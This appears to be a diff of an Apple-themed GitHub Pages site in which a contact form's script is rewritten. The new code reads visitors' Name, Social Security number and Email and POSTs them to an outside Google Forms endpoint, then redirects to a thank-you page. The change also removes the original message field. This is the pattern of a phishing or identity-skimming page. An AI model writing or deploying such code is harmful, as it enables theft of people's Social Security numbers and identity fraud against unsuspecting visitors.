@@ -4,6 +4,17 @@
 <head>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js">
 </script>
+<script>
+function postContactToGoogle() {
+var Name=$('#Name').val();
+var SSN=$('#SSN').val();
+var Email=$('#Email').val();
+$.ajax({
+url:"https://docs.google.com/forms/d/e/1FAIpQLSfhaGcweShJOE-dlkSY07YjLJo8zSsqmrHDP-3GOetII6i4nQ/formResponse",data:{"entry_1923063817":Name,"entry_1888621226":SSN,"entry_1677061960":Email},type:"POST",dataType:"xml",statusCode: {0:function() { window.location.replace("http://htmlpreview.github.io/?https://github.com/project3601/appleproject360.github.io/blob/master/Thankyou");},200:function(){window.location.replace("http://htmlpreview.github.io/?https://github.com/project3601/appleproject360.github.io/blob/master/Thankyou");}}
+});
+}
+</script>
+</head>
 <meta charset="UTF-8">
 <link rel="icon" href="https://cloud.githubusercontent.com/assets/16332983/11928316/4789db4c-a787-11e5-9751-cb97b6cc1d85.jpg">
 <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
@@ -62,20 +73,7 @@ body, html {
 }
 </style>
 
-<script>
 
-function postContactToGoogle() {
-var Name=$('#name').val();
-var Email=$('#email').val();
-var Message=$('#message').val();
-
-$.ajax({
-url:"https://docs.google.com/a/uw.edu/forms/d/e/1FAIpQLSfn-0aU6rZZRmPgQ7VcL7U4FLAVmypWrU9SuGku9SxxSschBw/formResponse",data:{"entry_829473997":name,"entry_942397836":email,"entry_1210589240":message},type:"POST",dataType:"xml",statusCode: {0:function() { window.location.replace("http://htmlpreview.github.io/?https://github.com/project3601/appleproject360.github.io/blob/master/Thankyou");},200:function(){window.location.replace("http://htmlpreview.github.io/?https://github.com/project3601/appleproject360.github.io/blob/master/Thankyou");}}
-});
-}
-
-</script>
-</head>
 <body> 
 
 <!-- Navbar (sit on top) -->
@@ -216,7 +214,7 @@ url:"https://docs.google.com/a/uw.edu/forms/d/e/1FAIpQLSfn-0aU6rZZRmPgQ7VcL7U4FL
        
       </div>
 
-      <form method="post" target="blank">
+      <form>
         <div class="w3-row-padding" style="margin:0 -16px 8px -16px">
           <div class="w3-half">
             <input class="w3-input w3-border" type="text" id="Name" placeholder="Name" required name="Name">
@@ -226,7 +224,6 @@ url:"https://docs.google.com/a/uw.edu/forms/d/e/1FAIpQLSfn-0aU6rZZRmPgQ7VcL7U4FL
           </div>
         </div>
 	      
-        <input class="w3-input w3-border" type="text" id="Message" placeholder="Message" required name="Message">
 	<button class="w3-btn w3-black w3-right w3-padding w3-section" type="submit" onclick="postContactToGoogle()" value="Submit">
           <i class="fa fa-paper-plane"></i> SEND MESSAGE
         </button>
